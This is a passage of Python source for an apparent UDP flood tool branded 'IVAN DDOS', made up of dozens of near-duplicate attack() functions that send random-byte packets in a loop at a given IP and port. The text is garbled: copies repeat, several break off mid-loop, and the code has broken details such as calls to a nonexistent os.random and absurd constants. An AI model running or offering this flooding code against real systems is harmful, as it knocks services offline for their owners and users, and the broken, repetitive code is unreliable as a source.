    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
